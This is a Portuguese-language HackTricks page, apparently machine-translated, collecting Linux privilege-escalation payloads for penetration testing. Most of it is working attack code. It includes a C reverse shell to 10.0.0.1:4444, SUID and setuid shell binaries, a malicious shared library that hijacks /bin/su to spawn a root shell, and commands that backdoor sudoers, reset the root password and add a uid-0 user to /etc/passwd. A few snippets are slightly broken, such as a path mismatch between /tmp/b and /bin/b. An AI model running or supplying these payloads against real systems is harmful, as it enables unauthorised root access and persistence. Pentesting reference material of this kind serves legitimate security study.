## Cargas úteis para executar

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

### Executando payloads

#### Payloads em C

Os payloads em C são uma opção popular para executar código arbitrário em um sistema. Eles são compilados em binários nativos, o que os torna mais difíceis de detectar do que os scripts interpretados. Aqui está um exemplo de um payload em C que executa um shell reverso:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv) {
    int sockfd;
    struct sockaddr_in serv_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("10.0.0.1");
    serv_addr.sin_port = htons(4444);

    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

Este payload se conectará a um shell reverso em `10.0.0.1:4444`. Para compilar o payload, use o seguinte comando:

```bash
gcc payload.c -o payload
```

Isso criará um binário chamado `payload` que pode ser executado em um sistema.
```c
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```
## Sobrescrevendo um arquivo para escalar privilégios

### Arquivos comuns

* Adicionar usuário com senha ao _/etc/passwd_
* Alterar a senha dentro do _/etc/shadow_
* Adicionar usuário ao sudoers em _/etc/sudoers_
* Abusar do docker através do socket do docker, geralmente em _/run/docker.sock_ ou _/var/run/docker.sock_

### Sobrescrevendo uma biblioteca

Verifique uma biblioteca usada por algum binário, neste caso `/bin/su`:
```bash
ldd /bin/su
        linux-vdso.so.1 (0x00007ffef06e9000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Neste caso, vamos tentar se passar por `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Então, verifique as funções desta biblioteca usadas pelo binário **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Os símbolos `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` e `audit_fd` provavelmente são provenientes da biblioteca libaudit.so.1. Como a libaudit.so.1 será sobrescrita pela biblioteca compartilhada maliciosa, esses símbolos devem estar presentes na nova biblioteca compartilhada, caso contrário, o programa não será capaz de encontrar o símbolo e sairá.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
Agora, apenas chamando **`/bin/su`**, você obterá um shell como root.

## Scripts

Você pode fazer o root executar algo?

### **www-data para sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Alterar a senha de root**

Para alterar a senha de root, você pode usar o seguinte payload:

```bash
echo "<NEW_PASSWORD>" | sudo passwd --stdin root
```

Substitua `<NEW_PASSWORD>` pela nova senha que você deseja definir.
```bash
echo "root:hacked" | chpasswd
```
### Adicionar novo usuário root ao /etc/passwd
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
